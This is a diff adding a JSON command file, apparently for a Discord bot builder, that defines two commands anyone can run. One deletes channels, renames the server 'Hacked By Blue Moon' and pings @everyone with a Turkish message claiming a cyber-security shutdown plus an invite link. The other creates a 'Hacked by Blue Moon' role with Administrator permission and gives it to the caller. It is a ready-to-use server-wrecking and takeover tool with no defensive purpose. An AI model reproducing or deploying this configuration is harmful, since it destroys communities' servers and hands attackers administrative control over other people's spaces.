@@ -1,0 +1,96 @@
+[
+  null,
+  {
+    "name": "başla",
+    "permissions": "NONE",
+    "restriction": "4",
+    "_id": "zLYSF",
+    "actions": [
+      {
+        "storage": "0",
+        "varName": "",
+        "name": "Delete Message"
+      },
+      {
+        "server": "0",
+        "varName": "",
+        "info": "15",
+        "storage": "1",
+        "varName2": "member",
+        "name": "Store Server Info"
+      },
+      {
+        "server": "0",
+        "varName": "",
+        "info": "13",
+        "storage": "1",
+        "varName2": "can",
+        "name": "Store Server Info"
+      },
+      {
+        "storage": "3",
+        "varName": "can",
+        "name": "Delete Channel"
+      },
+      {
+        "server": "0",
+        "varName": "",
+        "serverName": "Hacked By Blue Moon ",
+        "name": "Set Server Name"
+      },
+
+
+
+
+
+
+      {
+        "channel": "4",
+        "varName": "",
+        "message": "Blue Moon: sunucunuz siber güvenlik tarafından kapatıldı! \n@everyone \nBlueMoon/|/https://discord.gg/XgREF3e",
+        "storage": "0",
+        "varName2": "",
+        "name": "Send Message"
+      }
+	  
+	  
+    ]
+  },
+  {
+    "name": "cyber",
+    "permissions": "NONE",
+    "restriction": "4",
+    "_id": "uUGPC",
+    "actions": [
+      {
+        "storage": "0",
+        "varName": "",
+        "name": "Delete Message"
+      },
+      {
+        "roleName": "Hacked by Blue Moon",
+        "hoist": "false",
+        "mentionable": "false",
+        "color": "blue",
+        "position": "",
+        "storage": "1",
+        "varName": "role",
+        "name": "Create Role"
+      },
+      {
+        "role": "3",
+        "varName": "role",
+        "permission": "Yönetici",
+        "state": "0",
+        "name": "Set Role Permissions"
+      },
+      {
+        "member": "1",
+        "varName2": "",
+        "role": "3",
+        "varName": "role",
+        "name": "Add Member Role"
+      }
+    ]
+  }
+]
